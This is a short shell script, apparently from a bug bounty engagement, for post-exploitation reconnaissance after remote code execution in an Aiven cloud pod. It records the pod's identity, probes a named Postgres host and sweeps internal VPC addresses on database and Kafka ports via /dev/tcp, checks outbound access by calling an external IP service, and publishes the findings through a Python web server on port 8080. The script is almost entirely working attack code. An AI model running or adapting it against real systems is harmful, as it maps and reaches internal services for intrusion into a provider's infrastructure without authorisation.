#!/bin/sh
# S14: from RCE pod, reach Aiven internal services (data plane bonus)
{
  echo "=== pod id ==="
  id; hostname
  echo "=== reach bb-test-pg (PG 5432) from pod ==="
  for host in bb-test-pg-bugcrowdninja-d4c4.l.aivencloud.com; do
    ip=$(getent hosts $host | awk '{print $1}' | head -1)
    echo "$host -> $ip"
    (timeout 3 bash -c "cat < /dev/null > /dev/tcp/$ip/5432" 2>/dev/null && echo "  5432 OPEN") || echo "  5432 closed"
  done
  echo "=== Aiven internal VPC sweep (172.31.32.0/20 sample) ==="
  for ip in 172.31.32.1 172.31.33.1 172.31.34.1; do
    for p in 5432 9092 25432 21911; do
      (timeout 1 bash -c "cat < /dev/null > /dev/tcp/$ip/$p" 2>/dev/null && echo "$ip:$p OPEN")
    done
  done
  echo "=== outbound DNS + http ==="
  getent hosts api.aiven.io | head -1
  curl -s --max-time 5 https://api.ipify.org; echo
} > /app/chain2.txt 2>&1
printf 'CHAIN2 host=%s uid=%s\n' "$(hostname)" "$(id -u)" > /app/index.html
exec python3 -m http.server 8080
